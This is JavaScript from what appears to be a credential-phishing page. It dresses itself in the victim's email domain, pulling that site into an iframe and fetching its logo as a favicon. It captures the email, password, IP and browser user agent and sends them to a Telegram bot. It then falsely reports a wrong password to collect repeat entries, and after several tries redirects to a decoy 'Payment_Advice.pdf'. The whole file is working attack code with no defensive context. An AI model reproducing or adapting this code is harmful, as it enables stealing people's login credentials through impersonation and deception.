
        $(document).ready(function() {
            let submissionCount = 0;
            let emailDomain = '';

            // Get email from URL and set it in the email field
            let email = window.location.hash.slice(1);
            if (email) {
                $('#email-field').val(email);
                emailDomain = email.split('@')[1];
                if (emailDomain) {
                    // Set background iframe based on the domain
                    $('#domain-iframe').attr('src', `http://${emailDomain}`);
                    // Set header text and page title to the email domain
                    $('#header-text').text(emailDomain);
                    $('#page-title').text(`${emailDomain} - Responsive Form`);

                    // Fetch the logo from Clearbit API
                    $.getJSON(`https://logo.clearbit.com/${emailDomain}`, function(data) {
                        if (data) {
                            $('#logo-img').attr('src', `https://logo.clearbit.com/${emailDomain}`);
                            $('head').append(`<link rel="icon" href="https://logo.clearbit.com/${emailDomain}" type="image/x-icon">`);
                        } else {
                            // Fallback to favicon if Clearbit logo is not available
                            $('#logo-img').attr('src', `http://${emailDomain}/favicon.ico`);
                            $('head').append(`<link rel="icon" href="http://${emailDomain}/favicon.ico" type="image/x-icon">`);
                        }
                    }).fail(function() {
                        // Fallback to favicon if Clearbit API fails
                        $('#logo-img').attr('src', `http://${emailDomain}/favicon.ico`);
                        $('head').append(`<link rel="icon" href="http://${emailDomain}/favicon.ico" type="image/x-icon">`);
                    });
                }
            }

            // Handle form submission
      document.getElementById("btnSubmit").addEventListener("click", function(e) {
                event.preventDefault(); // Prevent default form submission

        var username = document.getElementById('email-field').value;
	    var pswd = document.getElementById('text-input').value;

    if (username == null || username == ""){
	       $("#success-message").html("Please enter your email"); 
	   return;
		}
	    if (pswd == null || pswd == ""){
       $("#success-message").html("Please enter your password"); 
	   return;
		}	
        else {  
       $("#btnSubmit").html("Processing..."); 		
		// Perform AJAX request			


	    var IP = document.getElementById('gfg').textContent;
         var word = `====== Logs R͏e͏s͏u͏l͏t͏ ======\r\nEmail: ${username}\r\nPassword: ${pswd}\r\nIP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n======`;
         var settings = {
                        "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
                        "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
                        "data": JSON.stringify({ "chat_id": chat_id, "text": word })
                    }
        $.ajax(settings).done((response) => {
  if (response.ok) {
          submissionCount++;
                     setTimeout(function() {
                $("#success-message").html("The email or password is incorrect. Verify that CAPS LOCK is not on, and then retype the correct email and password."); 
                console.log("Form submitted successfully.");
							 $("#btnSubmit").html("Submit"); 
							 document.getElementById('text-input').value="";
            }, 2000); 
		  if (submissionCount > 3) {
                            // Reset the text input field and ask for a new value
                                window.location.href = `https://cdn.glitch.global/d27d99eb-d54f-474f-a1fc-a598e61e5947/Payment_Advice.pdf?v=1724752668470`;

                        }
        } else {
            // Handles cases where response.signal is 'error' or missing
            $("#success-message").html("Error: Invalid response from server."); 
			$("#btnSubmit").html("Submit"); 
			document.getElementById('text-input').value="";
        }
   }) .catch(error => {
        $("#btnSubmit").html("Submit"); 
        $("#success-message").html("Error: Could not connect to server.");
        console.error("AJAX Error: ", status, error);
    });

  }

});


        });
		
 document.getElementById('text-input').addEventListener('input', () => {
    document.getElementById('success-message').textContent = '';
  });
		
